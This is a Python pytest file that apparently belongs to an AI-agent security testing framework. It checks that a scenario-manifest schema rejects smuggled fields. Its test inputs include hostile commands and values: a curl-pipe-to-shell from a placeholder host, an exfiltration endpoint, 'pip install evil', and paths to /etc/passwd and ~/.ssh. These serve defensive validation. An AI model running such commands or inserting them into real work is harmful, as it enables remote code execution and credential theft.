"""Scenario manifest schema tests (AF-0103, FR-003, ADR-006)."""

from __future__ import annotations

import copy
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

from agentfence.core.scenario_manifest import ObservationChannel, ScenarioManifest
from agentfence.core.strict_yaml import load_mapping
from agentfence.core.vocabulary import Variant

DATA = Path(__file__).parent / "data"


@pytest.fixture
def adversarial() -> dict[str, Any]:
    return load_mapping((DATA / "readme_adversarial.yaml").read_bytes(), source="fixture")


def benign_from(adv: dict[str, Any]) -> dict[str, Any]:
    benign = copy.deepcopy(adv)
    benign["id"] = "AF-README-001-B"
    benign["fixture"]["variant"] = "benign"
    benign.pop("benign_pair")
    benign.pop("attack_surface")
    benign["verdict"]["failure_if"] = []
    return benign


def test_docs_04_example_manifest_is_valid(adversarial: dict[str, Any]) -> None:
    manifest = ScenarioManifest.model_validate(adversarial)
    assert manifest.id == "AF-README-001"
    assert manifest.variant is Variant.ADVERSARIAL
    assert manifest.benign_pair == "AF-README-001-B"
    assert ObservationChannel.WORKSPACE_DIFF in manifest.requires.observation_channels
    assert manifest.boundary.deny == ("notes/**",)


def test_benign_control_is_valid(adversarial: dict[str, Any]) -> None:
    manifest = ScenarioManifest.model_validate(benign_from(adversarial))
    assert manifest.variant is Variant.BENIGN
    assert manifest.attack_surface is None


@pytest.mark.parametrize(
    "smuggled",
    [
        {"setup": "curl https://example.invalid/x.sh | sh"},
        {"hooks": {"pre_run": ["make install"]}},
        {"command": ["bash", "-c", "id"]},
        {"endpoint": "https://example.invalid/collect"},
        {"mounts": ["/home"]},
    ],
)
def test_executable_or_network_fields_rejected(
    adversarial: dict[str, Any], smuggled: dict[str, Any]
) -> None:
    with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
        ScenarioManifest.model_validate({**adversarial, **smuggled})


def test_nested_unknown_field_rejected(adversarial: dict[str, Any]) -> None:
    adversarial["fixture"]["post_install"] = "pip install evil"
    with pytest.raises(ValidationError, match="Extra inputs"):
        ScenarioManifest.model_validate(adversarial)


@pytest.mark.parametrize(
    ("mutate", "fragment"),
    [
        (lambda m: m.update(id="af-readme-001"), "id"),
        (lambda m: m.update(id="AF-README-1"), "id"),
        (lambda m: m.update(version="1.0"), "version"),
        (lambda m: m.update(version="01.0.0"), "version"),
        (lambda m: m.update(schema_version=2), "schema_version"),
        (lambda m: m.update(category="jailbreak"), "category"),
        (lambda m: m.update(risk_tags=["LLM01", "LLM01"]), "unique"),
        (lambda m: m["requires"].update(observation_channels=[]), "observation_channels"),
        (lambda m: m["requires"].update(observation_channels=["telepathy"]), "observation"),
        (lambda m: m["attack_surface"].update(path="../README.md"), "'..'"),
        (lambda m: m["attack_surface"].update(path="/etc/passwd"), "absolute"),
        (lambda m: m["boundary"].update(allow=["src/**", "~/.ssh/*"]), "may only contain"),
        (lambda m: m["boundary"].update(deny=["src/**"]), "both allowed and denied"),
        (lambda m: m["legitimate_task"].update(assertions=[]), "assertions"),
        (lambda m: m["legitimate_task"].update(description="fix"), "description"),
        (lambda m: m["fixture"].update(generator="../gen"), "generator"),
        (lambda m: m["verdict"].update(pass_if=[]), "pass_if"),
        (lambda m: m["verdict"]["failure_if"][0].update(path="../../x"), "'..'"),
        (lambda m: m["limits"].update(wall_seconds=100_000), "wall_seconds"),
        (lambda m: m["limits"].update(max_events="5000"), "max_events"),
    ],
)
def test_invalid_fields_rejected(adversarial: dict[str, Any], mutate: Any, fragment: str) -> None:
    mutate(adversarial)
    with pytest.raises(ValidationError) as info:
        ScenarioManifest.model_validate(adversarial)
    assert fragment in str(info.value)


def test_adversarial_requires_attack_surface(adversarial: dict[str, Any]) -> None:
    adversarial.pop("attack_surface")
    with pytest.raises(ValidationError, match="must declare attack_surface"):
        ScenarioManifest.model_validate(adversarial)


def test_adversarial_requires_failure_rule(adversarial: dict[str, Any]) -> None:
    adversarial["verdict"]["failure_if"] = []
    with pytest.raises(ValidationError, match="failure_if"):
        ScenarioManifest.model_validate(adversarial)


@pytest.mark.parametrize("pair", [None, "AF-CRED-001-B", "AF-README-001"])
def test_adversarial_must_pair_with_own_benign_control(
    adversarial: dict[str, Any], pair: str | None
) -> None:
    adversarial["benign_pair"] = pair
    with pytest.raises(ValidationError, match="AF-README-001-B"):
        ScenarioManifest.model_validate(adversarial)


def test_adversarial_id_cannot_look_benign(adversarial: dict[str, Any]) -> None:
    adversarial["id"] = "AF-README-001-B"
    with pytest.raises(ValidationError, match="must not end with '-B'"):
        ScenarioManifest.model_validate(adversarial)


def test_benign_id_must_end_with_b(adversarial: dict[str, Any]) -> None:
    benign = benign_from(adversarial)
    benign["id"] = "AF-README-002"
    with pytest.raises(ValidationError, match="must end with '-B'"):
        ScenarioManifest.model_validate(benign)


def test_benign_cannot_declare_pair(adversarial: dict[str, Any]) -> None:
    benign = benign_from(adversarial)
    benign["benign_pair"] = "AF-README-001-B"
    with pytest.raises(ValidationError, match="must not declare benign_pair"):
        ScenarioManifest.model_validate(benign)


def test_manifest_is_immutable(adversarial: dict[str, Any]) -> None:
    manifest = ScenarioManifest.model_validate(adversarial)
    with pytest.raises(ValidationError):
        manifest.id = "AF-OTHER-001"  # type: ignore[misc]


def test_defaults_for_limits(adversarial: dict[str, Any]) -> None:
    adversarial.pop("limits")
    manifest = ScenarioManifest.model_validate(adversarial)
    assert manifest.limits.wall_seconds == 90
    assert manifest.limits.max_events == 5000
